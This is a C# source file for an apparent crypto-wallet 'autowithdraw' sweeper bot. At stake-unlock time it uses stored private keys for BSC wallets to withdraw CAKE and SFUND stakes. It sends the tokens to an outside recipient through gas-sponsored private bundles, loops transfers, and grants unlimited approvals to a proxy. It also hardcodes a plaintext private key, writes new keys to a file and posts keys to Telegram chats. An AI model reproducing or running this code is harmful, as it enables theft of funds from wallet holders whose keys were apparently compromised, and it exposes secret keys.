using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using NBitcoin;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.WebSocketStreamingClient;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.RPC.Reactive.Eth.Subscriptions;
using Nethereum.Signer;
using Nethereum.Util;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using System;
using System.Collections.Generic;
using System.IO;
using System.Numerics;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using Network = Autowithdraw.Global.Network;
using Transaction = Nethereum.RPC.Eth.DTOs.Transaction;

namespace Autowithdraw.Main.Actions
{
    class Stake
    {
        public static async Task Timer(Stakes Stake, BigInteger Amount, int Destination)
        {
            while (true)
            {
                try
                {
                    int Timestamp = NBitcoin.Extensions.ToUnixTimestamp(DateTime.UtcNow);

                    for (int i = 1; i <= 18; i++)
                    {
                        if (Timestamp == Destination - 3600 * i)
                        {
                            await Settings.Profits.Bot.SendTextMessageAsync(-1001836638477, $"{i} hours until unlock {Stake.Name} <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>", ParseMode.Html);
                            await Settings.BotTransaction.Bot.SendTextMessageAsync(-4094775814, $"{i} hours until unlock {Stake.Name} <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>", ParseMode.Html);
                        }
                    }

                    for (int i = 10; i <= 50; i += 10)
                    {
                        if (Timestamp == Destination - 60 * (i == 0 ? 1 : i))
                        {
                            await Settings.Profits.Bot.SendTextMessageAsync(-1001836638477, $"{i} minutes until unlock {Stake.Name} <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>", ParseMode.Html);
                            await Settings.BotTransaction.Bot.SendTextMessageAsync(-4094775814, $"{i} minutes until unlock {Stake.Name} <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>", ParseMode.Html);
                        }
                    }

                    if (Timestamp >= Destination && (Timestamp - Destination) < 600)
                    {
                        await Settings.Profits.Bot.SendTextMessageAsync(-1001836638477, $"✅ Withdrawing {Stake.Name} <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>...", ParseMode.Html);
                        await Settings.BotTransaction.Bot.SendTextMessageAsync(-4094775814, $"✅ Withdrawing {Stake.Name} <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>...", ParseMode.Html);

                        Pricing.EventsStaking = 100;

                        if (Stake.Name == "SFUND")
                            await Sfund(Stake, Amount);

                        if (Stake.Name == "CAKE")
                            await Cake(Stake, Amount);
                    }
                }
                catch (Exception e)
                {
                    await Network.SendTelegram(e.Message);
                }
                Thread.Sleep(1000);
            }
        }


        public static async Task Cake(
            Stakes Stake,
            BigInteger Amount)
        {
            try
            {
                Flashbots.Withdrawing.Add(Stake.Address);

                #region Transfer

                new Thread(async () =>
                {
                    try
                    {
                        #region Values

                        Web3 Account = new Web3(new Account(Settings.Wallets[Stake.Address], 56),
                            Settings.Chains[56].HTTPClient);
                        ContractHelper Contract = new ContractHelper(Stake.Address, "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", Account);
                        Function Transfer = Contract.Get("transfer");

                        #endregion

                        while (true)
                        {
                            try
                            {
                                BigInteger Balance = await Contract.Balance();

                                BigInteger GasLimit = await Transfer.EstimateGasAsync(Stake.Address, null, null, Settings.Config.Recipient, Balance);

                                await Transfer.SendTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    Gas = new HexBigInteger(GasLimit),
                                    GasPrice = new HexBigInteger(await Pricing.GetGwei(56)),
                                    Nonce = new HexBigInteger((await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Stake.Address,
                                        BlockParameter.BlockParameterType.latest)).Value)
                                }, Settings.Config.Recipient, Balance);
                            }
                            catch (Exception e)
                            {
                                if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("insufficient"))
                                {
                                    Thread.Sleep(50);
                                    continue;
                                }
                            }

                            Thread.Sleep(300);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.Error(e);
                    }
                }).Start();

                #endregion

                #region Approve

                new Thread(async () =>
                {
                    try
                    {
                        #region Values

                        Web3 Account = new Web3(new Account(Settings.Wallets[Stake.Address], 56),
                            Settings.Chains[56].HTTPClient);
                        ContractHelper Contract = new ContractHelper(Stake.Address, "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", Account);
                        string Destination = Settings.Config.Proxy.Address;

                        Function Approve = Contract.Get("approve");
                        BigInteger GasLimit = await Approve.EstimateGasAsync(Stake.Address, null, null, Destination, Settings.MaxInt);

                        #endregion

                        while (true)
                        {
                            try
                            {
                                #region Filtering Gas

                                BigInteger AccountWei = (await Account.Eth.GetBalance.SendRequestAsync(Stake.Address)).Value - 666;
                                BigInteger GasPrice = AccountWei / GasLimit;
                                if (GasPrice < 0)
                                    throw new Exception("Not have balance");

                                #endregion

                                await Approve.SendTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    Gas = new HexBigInteger(GasLimit),
                                    GasPrice = new HexBigInteger(GasPrice),
                                    Nonce = new HexBigInteger((await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Stake.Address,
                                        BlockParameter.BlockParameterType.latest)).Value)
                                }, Destination, Settings.MaxInt);
                            }
                            catch (Exception e)
                            {
                                if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("Not have balance"))
                                {
                                    Thread.Sleep(50);
                                    continue;
                                }
                            }

                            Thread.Sleep(300);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.Error(e);
                    }
                }).Start();

                #endregion

                #region Values

                var key = EthECKey.GenerateKey();

                Account MainAccount =
                    new Account("bc26614b844c734639d4d8bbf2ef70bbff89d3e37ce813debd7ca5c3c9a3965c", 56);
                Account RecipientAccount = new Account(key, 56);

                Logger.Debug(key.GetPrivateKey() + " Recipient created");
                await File.AppendAllTextAsync("./Keys.txt", $"{key.GetPrivateKey()}\n");

                Web3 Main = new Web3(MainAccount, Settings.Chains[56].HTTPClient);
                Web3 Account = new Web3(new Account(Settings.Wallets[Stake.Address], 56), Settings.Chains[56].HTTPClient);

                ContractHelper Contract = new ContractHelper(Stake.Address, "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", Account);

                Function Transfer = Contract.Get("transfer");

                BigInteger Gwei = Web3.Convert.ToWei(Stake.Gwei, UnitConversion.EthUnit.Gwei);
                BigInteger SponsoredWei = (60000000000 * 400000) + (60000000000 * 140000) + 1000000000000000;

                #endregion

                #region First Bundle

                BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                    Stake.Address, BlockParameter.BlockParameterType.latest);

                Bundle bundle = new Bundle
                {
                    jsonrpc = "2.0",
                    id = 48,
                    method = "eth_sendPuissant",
                    @params = new[]
                    {
                        new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await MainAccount.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = MainAccount.Address,
                                    To = Stake.Address,
                                    Value = new HexBigInteger(SponsoredWei),
                                    GasPrice = new HexBigInteger(Gwei),
                                    Nonce = new HexBigInteger(
                                        await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            MainAccount.Address,
                                            BlockParameter.BlockParameterType.latest))
                                }),
                                /*"0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = Stake.ContractAddress,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(600000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = $"0x2f6c493c000000000000000000000000{Stake.Address.Substring(2).ToLower()}"
                                }),*/
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = Stake.ContractAddress,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(400000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = "0x853828b6"
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(140000),
                                    Nonce = new HexBigInteger(Nonce+1),
                                    Data = Transfer.GetData(Settings.Config.Recipient, Amount)
                                })
                            },
                            maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 60
                        }
                    }
                };


                List<string> txHashes = new List<string>
                    { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };

                Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));

                #endregion

                #region Notification

                using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[56].WSS);
                var subscription = new EthNewBlockHeadersObservableSubscription(client);
                bool subscribed = true;

                subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                {
                    try
                    {
                        var Block =
                            await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                .SendRequestAsync(block.Number);

                        #region Notification

                        bool Finded = false;
                        string findedHash = "";

                        foreach (Transaction transaction in Block.Transactions)
                        {
                            if (txHashes.Contains(transaction.TransactionHash))
                            {
                                Finded = true;
                                findedHash = transaction.TransactionHash;
                            }
                        }

                        if (Finded)
                        {
                            Logger.Debug($"Included in block - {block.Number}");
                            subscribed = false;

                            string Symbol = await Contract.Symbol();

                            Pricing.ValidPrice(56, Stake.Address, "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", Amount, Amount,
                                await Contract.Decimals(), Symbol, out float Price, out float Ether, out _);

                            Settings.Stats.AddFlashbotsSpend(Pricing.GetPriceEther(SponsoredWei, 56));
                            Settings.Stats.AddFlashbots(Price);

                            Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Stake.Address}",
                                ConsoleColor.Green);
                            await Network.SendTelegram(
                                $"{Pricing.GetEmoji(Price)} <a href=\"https://bscscan.com/tx/{findedHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>\nAmount: {Ether} <a href=\"https://bscscan.com/token/0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82?a={Stake.Address}\">{Symbol}</a> ({Price}$)\n\nPrivate Key: <code>{key.GetPrivateKey()}</code>",
                                "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", 56, true);

                            var Stakes = JsonSerializer.Deserialize<List<Stakes>>(await File.ReadAllTextAsync("stakes.json"));

                            Stakes.Remove(Stake);

                            await File.WriteAllTextAsync("./stakes.json", JsonSerializer.Serialize(Stakes,
                                new JsonSerializerOptions
                                {
                                    WriteIndented = true
                                }));

                            await Main.TransactionManager.SendTransactionAsync(new TransactionInput
                            {
                                From = MainAccount.Address,
                                To = RecipientAccount.Address,
                                Value = new HexBigInteger(11000000000000000),
                                GasPrice = new HexBigInteger(5000000000),
                                Nonce = new HexBigInteger(await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                    MainAccount.Address,
                                    BlockParameter.BlockParameterType.latest))
                            });

                            return;
                        }

                        #endregion

                        #region Second Bundle

                        Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                            Stake.Address, BlockParameter.BlockParameterType.latest);

                        bundle.@params[0] = new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await MainAccount.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = MainAccount.Address,
                                    To = Stake.Address,
                                    Value = new HexBigInteger(SponsoredWei),
                                    GasPrice = new HexBigInteger(Gwei),
                                    Nonce = new HexBigInteger(
                                        await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            MainAccount.Address,
                                            BlockParameter.BlockParameterType.latest))
                                }),
                                /*"0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = Stake.ContractAddress,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(600000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = $"0x2f6c493c000000000000000000000000{Stake.Address.Substring(2).ToLower()}"
                                }),*/
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = Stake.ContractAddress,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(400000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = "0x853828b6"
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(140000),
                                    Nonce = new HexBigInteger(Nonce+1),
                                    Data = Transfer.GetData(Settings.Config.Recipient, Amount)
                                })
                            },
                            maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 60
                        };

                        Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));
                        string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                        if (!txHashes.Contains(calculatedHash))
                            txHashes.Add(calculatedHash);

                        #endregion

                        Logger.Debug($"Block passed - {block.Number}");
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("transfer amount exceeds balance") ||
                            e.Message.Contains("eth_estimateGas"))
                        {
                            Logger.Error("Not balance");
                            subscribed = false;
                            return;
                        }

                        Logger.Error(e);
                    }
                });

                await client.StartAsync();
                await subscription.SubscribeAsync();
                while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));

                #endregion
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }

        public static async Task Sfund(
            Stakes Stake,
            BigInteger Amount)
        {
            try
            {
                Flashbots.Withdrawing.Add(Stake.Address);

                #region Transfer

                new Thread(async () =>
                {
                    try
                    {
                        #region Values

                        Web3 Account = new Web3(new Account(Settings.Wallets[Stake.Address], 56),
                            Settings.Chains[56].HTTPClient);
                        ContractHelper Contract = new ContractHelper(Stake.Address, "0x477bC8d23c634C154061869478bce96BE6045D12", Account);
                        Function Transfer = Contract.Get("transfer");

                        #endregion

                        while (true)
                        {
                            try
                            {
                                BigInteger Balance = await Contract.Balance();

                                BigInteger GasLimit = await Transfer.EstimateGasAsync(Stake.Address, null, null, Settings.Config.Recipient, Balance);

                                await Transfer.SendTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    Gas = new HexBigInteger(GasLimit),
                                    GasPrice = new HexBigInteger(await Pricing.GetGwei(56)),
                                    Nonce = new HexBigInteger((await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Stake.Address,
                                        BlockParameter.BlockParameterType.latest)).Value)
                                }, Settings.Config.Recipient, Balance);
                            }
                            catch (Exception e)
                            {
                                if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("insufficient"))
                                {
                                    Thread.Sleep(50);
                                    continue;
                                }
                            }

                            Thread.Sleep(300);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.Error(e);
                    }
                }).Start();

                #endregion

                #region Approve

                new Thread(async () =>
                {
                    try
                    {
                        #region Values

                        Web3 Account = new Web3(new Account(Settings.Wallets[Stake.Address], 56),
                            Settings.Chains[56].HTTPClient);
                        ContractHelper Contract = new ContractHelper(Stake.Address, "0x477bC8d23c634C154061869478bce96BE6045D12", Account);
                        string Destination = Settings.Config.Proxy.Address;

                        Function Approve = Contract.Get("approve");
                        BigInteger GasLimit = await Approve.EstimateGasAsync(Stake.Address, null, null, Destination, Settings.MaxInt);

                        #endregion

                        while (true)
                        {
                            try
                            {
                                #region Filtering Gas

                                BigInteger AccountWei = (await Account.Eth.GetBalance.SendRequestAsync(Stake.Address)).Value - 666;
                                BigInteger GasPrice = AccountWei / GasLimit;
                                if (GasPrice < 0)
                                    throw new Exception("Not have balance");

                                #endregion

                                await Approve.SendTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    Gas = new HexBigInteger(GasLimit),
                                    GasPrice = new HexBigInteger(GasPrice),
                                    Nonce = new HexBigInteger((await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Stake.Address,
                                        BlockParameter.BlockParameterType.latest)).Value)
                                }, Destination, Settings.MaxInt);
                            }
                            catch (Exception e)
                            {
                                if ((Helper.AddNonce(e) && !e.Message.Contains("already known")) || e.Message.Contains("Not have balance"))
                                {
                                    Thread.Sleep(50);
                                    continue;
                                }
                            }

                            Thread.Sleep(300);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.Error(e);
                    }
                }).Start();

                #endregion

                #region Values

                var key = EthECKey.GenerateKey();

                Account MainAccount =
                    new Account("0xbc26614b844c734639d4d8bbf2ef70bbff89d3e37ce813debd7ca5c3c9a3965c", 56);
                Account RecipientAccount = new Account(key, 56);

                Logger.Debug(key.GetPrivateKey() + " Recipient created");
                await File.AppendAllTextAsync("./Keys.txt", $"{key.GetPrivateKey()}\n");

                Web3 Main = new Web3(MainAccount, Settings.Chains[56].HTTPClient);
                Web3 Account = new Web3(new Account(Settings.Wallets[Stake.Address], 56), Settings.Chains[56].HTTPClient);

                ContractHelper Contract = new ContractHelper(Stake.Address, "0x477bC8d23c634C154061869478bce96BE6045D12", Account);

                Function Transfer = Contract.Get("transfer");

                BigInteger Gwei = Web3.Convert.ToWei(Stake.Gwei, UnitConversion.EthUnit.Gwei);
                BigInteger SponsoredWei = (60000000000 * 250000) + (60000000000 * 200000) + 1000000000000000;

                #endregion

                #region First Bundle

                BigInteger Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                    Stake.Address, BlockParameter.BlockParameterType.latest);

                Bundle bundle = new Bundle
                {
                    jsonrpc = "2.0",
                    id = 48,
                    method = "eth_sendPuissant",
                    @params = new[]
                    {
                        new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await MainAccount.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = MainAccount.Address,
                                    To = Stake.Address,
                                    Value = new HexBigInteger(SponsoredWei),
                                    GasPrice = new HexBigInteger(Gwei),
                                    Nonce = new HexBigInteger(
                                        await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            MainAccount.Address,
                                            BlockParameter.BlockParameterType.latest))
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = Stake.ContractAddress,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(250000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = "0x3ccfd60b"
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = "0x477bC8d23c634C154061869478bce96BE6045D12",
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(200000),
                                    Nonce = new HexBigInteger(Nonce+1),
                                    Data = Transfer.GetData(RecipientAccount.Address, Amount)
                                })
                            },
                            maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 50
                        }
                    }
                };


                List<string> txHashes = new List<string>
                    { "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]) };

                Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));

                #endregion

                #region Notification

                using StreamingWebSocketClient client = new StreamingWebSocketClient(Settings.Chains[56].WSS);
                var subscription = new EthNewBlockHeadersObservableSubscription(client);
                bool subscribed = true;

                subscription.GetSubscriptionDataResponsesAsObservable().Subscribe(async block =>
                {
                    try
                    {
                        var Block =
                            await Account.Eth.Blocks.GetBlockWithTransactionsByNumber
                                .SendRequestAsync(block.Number);

                        #region Notification

                        bool Finded = false;
                        string findedHash = "";

                        foreach (Transaction transaction in Block.Transactions)
                        {
                            if (txHashes.Contains(transaction.TransactionHash))
                            {
                                Finded = true;
                                findedHash = transaction.TransactionHash;
                            }
                        }

                        if (Finded)
                        {
                            Logger.Debug($"Included in block - {block.Number}");
                            subscribed = false;

                            string Symbol = await Contract.Symbol();

                            Pricing.ValidPrice(56, Stake.Address, "0x477bC8d23c634C154061869478bce96BE6045D12", Amount, Amount,
                                await Contract.Decimals(), Symbol, out float Price, out float Ether, out _);

                            Settings.Stats.AddFlashbotsSpend(Pricing.GetPriceEther(SponsoredWei, 56));

                            Logger.Debug($"Withdraw {Ether} {Symbol} ({Price}$) from {Stake.Address}",
                                ConsoleColor.Green);
                            await Network.SendTelegram(
                                $"{Pricing.GetEmoji(Price)} <a href=\"https://bscscan.com/tx/{findedHash}\">Autowithdraw {Symbol}</a>\n\nWallet: <a href=\"https://bscscan.com/address/{Stake.Address}\">{Stake.Address}</a>\nAmount: {Ether} <a href=\"https://bscscan.com/token/0x477bC8d23c634C154061869478bce96BE6045D12?a={Stake.Address}\">{Symbol}</a> ({Price}$)\n\nPrivate Key: <code>{key.GetPrivateKey()}</code>",
                                "0x477bC8d23c634C154061869478bce96BE6045D12", 56, true);

                            var Stakes = JsonSerializer.Deserialize<List<Stakes>>(await File.ReadAllTextAsync("stakes.json"));

                            Stakes.Remove(Stake);

                            await File.WriteAllTextAsync("./stakes.json", JsonSerializer.Serialize(Stakes,
                                new JsonSerializerOptions
                                {
                                    WriteIndented = true
                                }));

                            await Main.TransactionManager.SendTransactionAsync(new TransactionInput
                            {
                                From = MainAccount.Address,
                                To = RecipientAccount.Address,
                                Value = new HexBigInteger(11000000000000000),
                                GasPrice = new HexBigInteger(5000000000),
                                Nonce = new HexBigInteger(await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                    MainAccount.Address,
                                    BlockParameter.BlockParameterType.latest))
                            });

                            return;
                        }

                        #endregion

                        #region Second Bundle

                        Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                            Stake.Address, BlockParameter.BlockParameterType.latest);

                        bundle.@params[0] = new @params
                        {
                            txs = new List<string>
                            {
                                "0x" + await MainAccount.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = MainAccount.Address,
                                    To = Stake.Address,
                                    Value = new HexBigInteger(SponsoredWei),
                                    GasPrice = new HexBigInteger(Gwei),
                                    Nonce = new HexBigInteger(
                                        await Main.Eth.Transactions.GetTransactionCount.SendRequestAsync(
                                            MainAccount.Address,
                                            BlockParameter.BlockParameterType.latest))
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = Stake.ContractAddress,
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(250000),
                                    Nonce = new HexBigInteger(Nonce),
                                    Data = "0x3ccfd60b"
                                }),
                                "0x" + await Account.TransactionManager.SignTransactionAsync(new TransactionInput
                                {
                                    From = Stake.Address,
                                    To = "0x477bC8d23c634C154061869478bce96BE6045D12",
                                    GasPrice = new HexBigInteger(60000000000),
                                    Gas = new HexBigInteger(200000),
                                    Nonce = new HexBigInteger(Nonce+1),
                                    Data = Transfer.GetData(RecipientAccount.Address, Amount)
                                })
                            },
                            maxTimestamp = new DateTimeOffset(DateTime.UtcNow).ToUnixTimeSeconds() + 50
                        };

                        Logger.Debug(Network.Post(JsonSerializer.Serialize(bundle), "https://puissant-bsc.bnb48.club"));
                        string calculatedHash = "0x" + TransactionUtils.CalculateTransactionHash(bundle.@params[0].txs[^1]);
                        if (!txHashes.Contains(calculatedHash))
                            txHashes.Add(calculatedHash);

                        #endregion

                        Logger.Debug($"Block passed - {block.Number}");
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("transfer amount exceeds balance") ||
                            e.Message.Contains("eth_estimateGas"))
                        {
                            Logger.Error("Not balance");
                            subscribed = false;
                            return;
                        }

                        Logger.Error(e);
                    }
                });

                await client.StartAsync();
                await subscription.SubscribeAsync();
                while (subscribed) await Task.Delay(TimeSpan.FromSeconds(0.1));

                #endregion
            }
            catch (Exception e)
            {
                Logger.Error(e);
            }
        }
    }
}
